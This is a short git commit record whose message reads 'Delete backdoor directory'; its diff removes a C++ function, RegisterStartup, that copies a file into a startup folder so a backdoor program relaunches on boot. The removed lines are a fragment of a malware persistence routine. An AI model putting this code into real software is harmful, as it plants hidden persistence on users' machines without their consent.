308e68141f612db55bf10f21961c1704f4ef941e
Ryan Weiss <ryanweiss02@gmail.com>
2022-07-30 23:26:26 -0400

    Delete backdoor directory

--- backdoor/RegisterStartup.cpp
+++
@@ -1,9 +0,0 @@
-void RegisterStartup(std::string fileName)
-{
-    startupPath += fileName;
-    std::ifstream backdoorFile(startupPath);
-    
-    if (!backdoorFile.is_open()) {
-        CopyFileA(fileName.data(), startupPath.data(), 0);
-    }
-}
